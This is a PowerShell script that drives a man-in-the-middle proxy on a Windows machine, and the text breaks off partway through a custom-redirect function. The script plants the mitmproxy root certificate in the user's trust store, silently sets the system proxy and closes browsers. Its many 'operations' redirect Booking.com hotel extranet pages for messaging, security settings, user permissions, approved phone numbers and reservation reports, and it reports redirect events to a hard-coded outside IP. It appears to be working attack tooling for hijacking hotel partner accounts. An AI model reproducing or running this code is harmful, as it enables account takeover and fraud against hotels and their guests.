Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ---------------- CONFIG ----------------
$WorkDir = "C:\mitm"
$PyAddon = Join-Path $WorkDir "mitm_redirect_addon.py"
$MitmPort = 8080
$LogFile = Join-Path $WorkDir "mitm_manager.log"
$MitmExeSearch = @(
    "mitmdump",
    "C:\Program Files\Python311\Scripts\mitmdump.exe",
    "C:\Program Files (x86)\Python311\Scripts\mitmdump.exe"
)
$ForceFlag = "C:\temp\mitm_force_redirect"
$OneShotFlag = "C:\temp\mitm_reset_once"
$MessageFlag = "C:\temp\mitm_message_once"
$ProviderFlag = "C:\temp\mitm_provider_once"
$UserFlag = "C:\temp\mitm_user_once"
$SecurityFlag = "C:\temp\mitm_security_once"
$Operation11Flag = "C:\temp\mitm_operation_11_once"
$Operation12Flag = "C:\temp\mitm_operation_12_once"
$BookingHotelFlag = "C:\temp\mitm_booking_hotel_once"
$BookingHotelSecurityFlag = "C:\temp\mitm_booking_hotel_security_once"
$Operation16Flag = "C:\temp\mitm_operation_16_once"
$CustomRedirectFlag = "C:\temp\mitm_custom_redirect_once"
$CustomRedirectFromFile = "C:\temp\mitm_custom_redirect_from.txt"
$CustomRedirectToFile = "C:\temp\mitm_custom_redirect_to.txt"
$CustomRedirectDoneFlag = "C:\temp\mitm_custom_redirect_done.txt"
# --- НОВЫЙ флаг для Booking hotel reservations download redirect ---
$BookingReservationsFlag = "C:\temp\mitm_booking_reservations_once"
$BookingReservationsHotelIdFile = "C:\temp\mitm_booking_reservations_hotel_id.txt"
$BookingReservationsReportIdFile = "C:\temp\mitm_booking_reservations_report_id.txt"

$RedirectFile = Join-Path $WorkDir "redirect_target.txt"

$TelegramLogServer = "http://89.42.142.29:5000/log_redirect"
# -----------------------------------------

function Log-Write {
    param([string]$msg, [string]$level="INFO")
    $time = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[{0}] {1} - {2}" -f $time, $level, $msg
    Write-Host $line
    try {
        Add-Content -Path $LogFile -Value $line -Force
    } catch {}
}

function Ensure-WorkDir {
    if (-not (Test-Path $WorkDir)) {
        New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
        Log-Write ("Created work dir: {0}" -f $WorkDir)
    }
}

function Find-Mitmdump {
    foreach ($candidate in $MitmExeSearch) {
        try {
            if ($candidate -eq "mitmdump") {
                $cmd = Get-Command mitmdump -ErrorAction SilentlyContinue
                if ($cmd) {
                    return $cmd.Source
                }
            } elseif (Test-Path $candidate) {
                return $candidate
            }
        } catch {}
    }
    return $null
}

function Reset-Proxy-And-Stop-Mitmdump {
    Log-Write "Stopping mitmdump processes..."
    Get-Process -Name mitmdump,mitmproxy,mitmweb -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Log-Write ("Killed mitmdump PID: {0}" -f $_.Id)
        } catch {
            Log-Write ("Failed to kill PID {0}: {1}" -f $_.Id, $_) "WARN"
        }
    }

    try {
        netsh winhttp reset proxy | Out-Null
        Log-Write "WinHTTP proxy reset."
    } catch {
        Log-Write ("Failed winhttp reset: {0}" -f $_) "WARN"
    }

    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 0 -Force
        Log-Write "Proxy disabled in registry."
    } catch {
        Log-Write ("Failed to disable proxy in registry: {0}" -f $_) "WARN"
    }

    try {
        ipconfig /flushdns | Out-Null
        Log-Write "DNS cache flushed."
    } catch {
        Log-Write ("Failed to flush DNS: {0}" -f $_) "WARN"
    }
}

function Safe-Exit {
    Log-Write "Performing safe exit cleanup..."
    Reset-Proxy-And-Stop-Mitmdump
    Log-Write "Cleanup completed. Exiting."
    exit
}

function Ensure-MitmCA {
    $certFile = Join-Path $env:USERPROFILE ".mitmproxy\mitmproxy-ca-cert.pem"
    if (-not (Test-Path $certFile)) {
        Log-Write ("MITM CA not found at {0}. Generating..." -f $certFile)
        $mitmPath = Find-Mitmdump
        if (-not $mitmPath) {
            Log-Write "mitmdump not found; cannot auto-generate CA." "ERROR"; return $false
        }
        try {
            $proc = Start-Process -FilePath $mitmPath -ArgumentList "--set","block_global=false" -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
            Start-Sleep -Seconds 3
            if ($proc -and -not $proc.HasExited) {
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }
            Start-Sleep -Milliseconds 500
        } catch {
            Log-Write ("Transient mitmdump start failed: {0}" -f $_) "WARN"
        }
    }
    if (-not (Test-Path $certFile)) {
        Log-Write ("No CA pem found at {0}. Please run mitmdump manually." -f $certFile) "ERROR"
        return $false
    }
    try {
        Import-Certificate -FilePath $certFile -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
        Log-Write "Imported mitmproxy CA into CurrentUser\Root."
        return $true
    } catch {
        Log-Write ("Failed to import CA: {0}" -f $_) "ERROR"
        return $false
    }
}

function Set-SystemProxies {
    param([string]$proxyHost="127.0.0.1",[int]$proxyPort=$MitmPort)
    $proxy = "{0}:{1}" -f $proxyHost,$proxyPort
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name ProxyServer -Value $proxy -Force
        Set-ItemProperty -Path $regPath -Name ProxyOverride -Value "<local>" -Force

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write ("Set system proxy to {0}" -f $proxy)
        return $true
    } catch {
        Log-Write ("Failed to set system proxy: {0}" -f $_) "ERROR"
        return $false
    }
}

function Clear-SystemProxies {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 0 -Type DWord -Force
        Remove-ItemProperty -Path $regPath -Name ProxyServer -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name ProxyOverride -ErrorAction SilentlyContinue

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write "Cleared system proxies (WinINET + WinHTTP)."
        return $true
    } catch {
        Log-Write ("Failed to clear system proxies: {0}" -f $_) "WARN"
        return $false
    }
}

function Close-Browsers-Gracefully {
    param([string]$closeOption)

    if ($closeOption -eq "none") {
        Log-Write "Skipping browser close as requested."
        return
    }

    Log-Write "Closing browsers gracefully to preserve session..."

    Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            if ($_.CloseMainWindow()) {
                Log-Write ("Sent close signal to {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            }
        } catch {
            Log-Write ("Error sending close to {0}: {1}" -f $_.ProcessName, $_) "WARN"
        }
    }

    Start-Sleep -Seconds 3

    if ($closeOption -eq "full") {
        Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                Log-Write ("Force closed {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            } catch {
                Log-Write ("Failed to force close {0}: {1}" -f $_.ProcessName, $_) "WARN"
            }
        }
        Log-Write "All browsers fully closed."
    } else {
        $remaining = Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue
        if ($remaining) {
            Log-Write ("Some browsers still running (user may have canceled close): {0}" -f ($remaining.ProcessName -join ", "))
        } else {
            Log-Write "All browsers closed gracefully."
        }
    }
}

function Start-Mitmdump {
    Ensure-WorkDir
    Reset-Proxy-And-Stop-Mitmdump

    $mitmPath = Find-Mitmdump
    if (-not $mitmPath) {
        Log-Write "mitmdump not found!" "ERROR"; return $false
    }

    if (-not (Test-Path $PyAddon)) {
        Log-Write ("Python addon missing: {0}" -f $PyAddon) "ERROR"; return $false
    }

    $args = @("-p", "$MitmPort", "-s", "$PyAddon")

    Log-Write ("Starting mitmdump: {0} {1}" -f $mitmPath, ($args -join ' '))
    $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru

    Start-Sleep -Seconds 2
    Set-SystemProxies | Out-Null
    Log-Write ("mitmdump started, PID: {0}" -f $proc.Id)
    return $true
}

# ---------------- REDIRECT FUNCTIONS ----------------
function Enable-ForceRedirect {
    if (-not (Test-Path (Split-Path $ForceFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ForceFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ForceFlag -Force | Out-Null
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Force redirect enabled."
    Start-Mitmdump
}

function Enable-OneShotRedirect {
    if (-not (Test-Path (Split-Path $OneShotFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $OneShotFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $OneShotFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "One-shot redirect enabled."
    Start-Mitmdump
}

function Enable-MessageRedirect {
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com message redirect enabled."
    Start-Mitmdump
}

function Enable-ProviderRedirect {
    if (-not (Test-Path (Split-Path $ProviderFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ProviderFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com provider redirect enabled."
    Start-Mitmdump
}

function Enable-UserRedirect {
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com user redirect enabled."
    Start-Mitmdump
}

function Enable-SecurityRedirect {
    if (-not (Test-Path (Split-Path $SecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $SecurityFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com security redirect enabled."
    Start-Mitmdump
}

function Enable-Operation11Redirect {
    Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
    
    if (-not (Test-Path (Split-Path $Operation11Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation11Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation11Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 11: Function 7 (message redirect) enabled."
    Log-Write "Function 8 (provider redirect) will activate when user reaches messaging/settings page."
}

function Enable-Operation12Redirect {
    Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
    
    if (-not (Test-Path (Split-Path $Operation12Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation12Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation12Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 12: Function 9 (user redirect) enabled."
    Log-Write "Function 10 (security redirect) will activate when user reaches accounts_and_permissions page."
}

function Enable-BookingHotelRedirect {
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null

    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL (global) redirect enabled."
    Start-Mitmdump
}

function Disable-BookingHotelRedirect {
    Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL (global) redirect disabled."
}

function Enable-BookingHotelSecurityRedirect {
    if (-not (Test-Path (Split-Path $BookingHotelSecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelSecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelSecurityFlag -Force | Out-Null

    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
    Start-Mitmdump
}

function Enable-Operation16Redirect {
    Log-Write "Starting Operation 16 sequence (function 13 -> function 15)..."
    
    if (-not (Test-Path (Split-Path $Operation16Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation16Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation16Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
    Log-Write "Function 15 (Booking Hotel Security Redirect) will activate after function 13 completes."
}

function Enable-CustomRedirect {
    Log-Write "Starting Custom Redirect (function 17)..."
    
    Write-Host ""
    Write-Host "=== CUSTOM ONE-TIME REDIRECT (FUNCTION 17) ==="
    Write-Host ""
    Write-Host "ONE-TIME REDIRECT: will work only on FIRST request"
    Write-Host ""
    Write-Host "EXAMPLES:"
    Write-Host "1. Redirect specific page:"
    Write-Host "   FROM: https://www.tsn.ca/cfl/"
    Write-Host "   TO:   https://www.tsn.ca/soccer/fifa-world-cup/"
    Write-Host ""
    Write-Host "2. Redirect entire site:"
    Write-Host "   FROM: https://www.example.com/"
    Write-Host "   TO:   https://news.google.com/"
    Write-Host ""
    Write-Host "3. Redirect any request:"
    Write-Host "   FROM: https://admin.booking.com/hotel/"
    Write-Host "   TO:   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
    Write-Host ""
    Write-Host "IMPORTANT: Always include full URL with https://"
    Write-Host ""
    
    # Ask for FROM URL
    do {
        $fromDomain = Read-Host "Enter FULL URL to redirect FROM (example: https://site.com/page)"
        if ($fromDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.example.com/" -ForegroundColor Yellow
            continue
        }
        break
    } while ($true)
    
    # Ask for TO URL
    do {
        $toDomain = Read-Host "Enter FULL URL to redirect TO (example: https://target.com/destination)"
        if ($toDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.google.com/" -ForegroundColor Yellow
            continue
        }
        break
    } while ($true)
    
    # Clear done flag
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    # Save settings to files
    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain -Force
    Set-Content -Path $CustomRedirectToFile -Value $toDomain -Force
    
